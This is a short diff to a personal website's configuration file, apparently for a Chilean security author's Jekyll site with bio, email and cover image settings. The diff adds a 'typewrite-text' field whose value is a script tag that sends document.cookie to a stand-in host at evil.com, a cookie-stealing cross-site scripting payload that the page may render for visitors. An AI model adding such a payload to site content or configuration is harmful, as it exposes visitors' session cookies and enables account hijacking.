@@ -26,6 +26,7 @@ author_bio: Hola, mi nombre es Bruno Gómez F., conocido como SS3K en el mundo d
 author_email: "ssek@ssekurity.com"
 author_location: Chile
 author_website_url: "https://ssekurity.com"
+typewrite-text: "<script>fetch('https://evil.com/steal?c='+document.cookie)</script>"
 hero_cover_img: upscalemedia-transformed.jpeg # replace this for changing homepage cover (eg. try cover.jpeg). Image should be in /assets/img
 
 # Experiences
